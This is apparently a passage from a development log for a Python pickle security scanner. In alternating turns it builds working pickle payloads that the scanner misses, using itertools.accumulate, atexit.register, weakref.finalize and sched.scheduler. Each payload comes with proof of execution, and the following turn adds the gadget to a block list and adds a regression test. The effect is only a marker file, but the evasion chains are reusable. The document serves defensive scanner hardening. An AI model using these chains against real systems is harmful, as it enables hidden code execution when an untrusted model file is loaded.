- `itertools.groupby` is absent from `DANGEROUS_GLOBALS`; only
  `itertools.dropwhile`, `itertools.filterfalse`, `itertools.starmap`, and
  `itertools.takewhile` are currently listed.
- The payload uses only currently clean globals: `builtins.tuple`,
  `itertools.groupby`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is another lazy arbitrary-call sink that can be forced
by a benign builtin. The narrow next block is a sorted `DANGEROUS_GLOBALS`
entry for `("itertools", "groupby")`, plus a manual-pickle oracle regression
that proves scan-time detection before unpickle-time marker creation.

## Turn 28 - Block `itertools.groupby`

Blocking plan:

- Add `("itertools", "groupby")` to the sorted Rust `DANGEROUS_GLOBALS`
  table. `tuple` stays allowed because the arbitrary-call sink is `groupby`;
  `tuple` only forces iteration.
- Add portable policy coverage for raw `GLOBAL itertools groupby` reductions.
- Add a CPython oracle regression that manually builds
  `tuple(itertools.groupby([marker], pathlib.Path.touch))`, verifies scanner
  detection, then verifies the marker file appears only during unpickle.

Performance note: the fix adds one tuple to a sorted static table checked with
binary search. It does not add iterable-flow analysis or broader string
scanning.

## Turn 29 - `itertools.accumulate` binary-function call gap

Goal: produce another self-contained code-execution pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


marker = Path("/tmp/ma_itertools_accumulate_tuple_marker")
payload = b"".join(
    [
        b"\x80\x04",
        s("builtins"),
        s("tuple"),
        b"\x93",
        s("itertools"),
        s("accumulate"),
        b"\x93",
        b"]",
        s("pathlib"),
        s("PosixPath"),
        b"\x93(",
        s("/"),
        s("tmp"),
        s("ma_itertools_accumulate_tuple_marker"),
        b"tRa",
        s("x"),
        b"a",
        s("pathlib"),
        s("Path.write_text"),
        b"\x93",
        b"\x86R",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
  `notices=[]`
- Unpickle result: creates `/tmp/ma_itertools_accumulate_tuple_marker` with
  content `x` and returns
  `(PosixPath("/tmp/ma_itertools_accumulate_tuple_marker"), 1)`
- RCE mechanism: the pickle constructs
  `itertools.accumulate([marker, "x"], pathlib.Path.write_text)`, then
  immediately calls `tuple(...)` on that accumulate object. `accumulate()`
  stores an attacker-selected binary function and iterable inputs, while
  `tuple()` forces iteration during unpickling, invoking the function with
  attacker-controlled arguments. `Path.write_text()` writes the marker file and
  returns the number of characters written.

Why the scanner missed it:

- `itertools.accumulate` is absent from `DANGEROUS_GLOBALS`; only
  `itertools.dropwhile`, `itertools.filterfalse`, `itertools.groupby`,
  `itertools.starmap`, and `itertools.takewhile` are currently listed.
- The payload uses only currently clean globals: `builtins.tuple`,
  `itertools.accumulate`, `pathlib.Path.write_text`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is a lazy arbitrary binary-call sink that can be forced
by a benign builtin. The narrow next block is a sorted `DANGEROUS_GLOBALS`
entry for `("itertools", "accumulate")`, plus a manual-pickle oracle
regression that proves scan-time detection before unpickle-time marker
creation.

## Turn 30 - Block `itertools.accumulate`

Blocking plan:

- Add `("itertools", "accumulate")` to the sorted Rust `DANGEROUS_GLOBALS`
  table. `tuple` stays allowed because the arbitrary-call sink is
  `accumulate`; `tuple` only forces iteration.
- Add portable policy coverage for raw `GLOBAL itertools accumulate`
  reductions.
- Add a CPython oracle regression that manually builds
  `tuple(itertools.accumulate([marker, "x"], pathlib.Path.write_text))`,
  verifies scanner detection, then verifies the marker file appears only
  during unpickle.

Performance note: the fix adds one tuple to a sorted static table checked with
binary search. It does not add iterable-flow analysis or broader string
scanning.

## Turn 31 - `atexit.register` exit-time callback gap

Goal: produce a more aggressive RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_atexit_register_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("atexit", "register"),
        sg("pathlib", "Path.touch"),
        sg("pathlib", "PosixPath"),
        b"(",
        s("/"),
        s("tmp"),
        s("ma_atexit_register_marker"),
        b"tR",
        b"\x86R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`
- Scanner import references:
  `atexit.register`, `pathlib.Path.touch`, and `pathlib.PosixPath`, all with
  `is_dangerous=False`
- Unpickle result: registers `pathlib.Path.touch(marker)` as an exit handler
  without creating the marker immediately
- Exit-time result: when Python runs exit handlers, the registered callback
  creates `/tmp/ma_atexit_register_marker`
- RCE mechanism: `atexit.register()` stores an attacker-selected callable and
  attacker-controlled arguments for execution at interpreter shutdown. The
  unpickle operation arms the callback inside the host process, so the payload
  can survive a clean deserialization path and execute later when the process
  exits.

Why the scanner missed it:

- `atexit` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The payload uses only currently clean globals: `atexit.register`,
  `pathlib.Path.touch`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is a delayed arbitrary-call sink, not a parsing miss.
The narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
`("atexit", "register")`, plus a regression that verifies scanner detection
before proving that the registered callback fires at exit. The hot path remains
a static policy lookup with no callback-flow simulation.

## Turn 32 - Block `atexit.register`

Blocking plan:

- Add `("atexit", "register")` to the sorted Rust `DANGEROUS_GLOBALS` table.
  `pathlib.Path.touch` stays allowed because the arbitrary-call sink is
  `atexit.register`; the callback is attacker-selected data passed to that
  sink.
- Add portable policy coverage for raw `GLOBAL atexit register` reductions so
  detection does not depend on executing the stdlib function.
- Add a CPython oracle regression that manually builds
  `atexit.register(pathlib.Path.touch, marker)`, verifies scanner detection,
  then runs the payload in a child Python process and proves the marker appears
  when interpreter exit handlers fire.

Performance note: the fix adds one tuple to a sorted static table checked with
binary search. It does not add exit-handler simulation, callback-flow analysis,
or broader string scanning.

## Turn 33 - `weakref.finalize` reclaim-time callback gap

Goal: produce another aggressive RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_weakref_finalize_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("weakref", "finalize"),
        sg("collections", "UserList"),
        b")R",
        sg("pathlib", "Path.touch"),
        sg("pathlib", "PosixPath"),
        b"(",
        s("/"),
        s("tmp"),
        s("ma_weakref_finalize_marker"),
        b"tR",
        b"\x87R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`
- Scanner import references:
  `weakref.finalize`, `collections.UserList`, `pathlib.Path.touch`, and
  `pathlib.PosixPath`, all with `is_dangerous=False`
- Unpickle result: creates `/tmp/ma_weakref_finalize_marker` before
  `pickle.loads()` returns and returns a dead `weakref.finalize` object
- RCE mechanism: `weakref.finalize(obj, func, *args)` stores an
  attacker-selected callback and attacker-controlled arguments that execute
  when `obj` is reclaimed. The pickle constructs a temporary
  `collections.UserList()` object as the watched object, passes
  `pathlib.Path.touch(marker)` as the finalizer callback, and does not preserve
  any other strong reference to the watched object. CPython reclaims the object
  during unpickling, so the finalizer callback fires immediately.

Why the scanner missed it:

- `weakref` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The payload uses only currently clean globals: `weakref.finalize`,
  `collections.UserList`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is another arbitrary-callback sink, but the trigger is
object reclamation rather than explicit iteration or interpreter shutdown. The
narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
`("weakref", "finalize")`, plus a regression that proves the callback executes
before `pickle.loads()` returns. The hot path remains a static policy lookup.

## Turn 34 - Block `weakref.finalize`

Blocking plan:

- Add `("weakref", "finalize")` to the sorted Rust `DANGEROUS_GLOBALS` table.
  `collections.UserList` and `pathlib.Path.touch` stay allowed because
  `weakref.finalize` is the arbitrary-callback sink that wires the watched
  object, callback, and attacker-controlled callback arguments together.
- Add portable policy coverage for raw `GLOBAL weakref finalize` reductions so
  detection does not depend on object-reclamation timing.
- Add a CPython oracle regression that manually builds
  `weakref.finalize(collections.UserList(), pathlib.Path.touch, marker)`,
  verifies scanner detection, then proves the marker appears before
  `pickle.loads()` returns.

Performance note: the fix adds one tuple to a sorted static table checked with
binary search. It does not add lifetime simulation, weakref-specific stack
analysis, or broader callback-flow tracking.

## Turn 35 - `sched.scheduler` queued-callback dispatch gap

Goal: produce another immediate RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    return b"\x8c" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_sched_scheduler_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("sched", "scheduler"),
        b")R\x94",
        sg("sched", "scheduler.enter"),
        b"(",
        b"h\x00",
        b"K\x00",
        b"K\x00",
        sg("pathlib", "Path.touch"),
        sg("pathlib", "PosixPath"),
        b"(",
        s("/"),
        s("tmp"),
        s("ma_sched_scheduler_marker"),
        b"tR",
        b"\x85",
        b"tR0",
        sg("sched", "scheduler.run"),
        b"h\x00",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`
- Scanner import references:
  `sched.scheduler`, `sched.scheduler.enter`, `pathlib.Path.touch`,
  `pathlib.PosixPath`, and `sched.scheduler.run`, all with
  `is_dangerous=False`
- Unpickle result: creates `/tmp/ma_sched_scheduler_marker` before
  `pickle.loads()` returns and returns `None`
- RCE mechanism: the pickle constructs a `sched.scheduler()` object, memoizes
  it, calls `scheduler.enter(0, 0, pathlib.Path.touch, (marker,))` to queue an
  attacker-selected callback with attacker-controlled arguments, discards the
  returned event, then calls `scheduler.run()` on the same memoized scheduler.
  A zero-delay event is due immediately, so `run()` dispatches the callback
  during unpickling.

Why the scanner missed it:

- `sched` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The payload uses only currently clean globals: `sched.scheduler`,
  `sched.scheduler.enter`, `sched.scheduler.run`, `pathlib.Path.touch`, and
  `pathlib.PosixPath`.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is a scheduler callback dispatch sink, not an opcode
parser miss. The focused next block should add sorted `DANGEROUS_GLOBALS`
entries for `("sched", "scheduler.enter")`, `("sched", "scheduler.enterabs")`,
and `("sched", "scheduler.run")`, plus a manual-pickle oracle regression for
the memoized scheduler proof. The hot path remains static policy lookup.

## Turn 36 - Block `sched.scheduler` queued callbacks

Blocking plan:

- Add `("sched", "scheduler.enter")`, `("sched", "scheduler.enterabs")`, and
  `("sched", "scheduler.run")` to the sorted Rust `DANGEROUS_GLOBALS` table.
  `sched.scheduler` itself stays allowed because it only creates the scheduler;
  `enter`/`enterabs` wire attacker-selected callbacks and `run` dispatches
  queued callbacks.
- Add portable policy coverage for all three raw global reductions so
  detection does not depend on callback timing.
- Add a CPython oracle regression that manually builds the memoized scheduler
  payload, verifies scanner detection for `scheduler.enter` and
  `scheduler.run`, then proves the queued callback creates the marker during
  `pickle.loads()`.

Performance note: the fix adds three tuples to a sorted static table checked
with binary search. It does not add scheduler state modeling, event queue
simulation, or broader callback-flow tracking.
